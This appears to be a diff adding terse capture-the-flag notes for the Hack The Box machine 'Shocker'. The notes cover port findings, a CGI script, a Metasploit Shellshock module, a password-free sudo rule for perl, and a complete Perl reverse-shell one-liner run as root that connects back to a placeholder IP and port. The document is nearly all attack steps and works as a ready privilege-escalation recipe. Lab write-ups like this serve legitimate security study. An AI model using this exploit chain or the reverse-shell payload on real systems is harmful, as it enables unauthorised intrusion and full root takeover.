@@ -1,0 +1,12 @@
+Shocker
+=================
+- 80: httpd 2.4.18
+- 2222: SSH
+
+- dirb: http://shocker.htb/cgi-bin/user.sh
+- exploit/multi/http/apache_mod_cgi_bash_env_exec
+- cat /home/shelly/user.txt
+- sudo -l
+   (root) NOPASSWD: /usr/bin/perl
+- sudo perl -e 'use Socket;$i="<IP>";$p=<PORT>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+- cat /root/root.txt
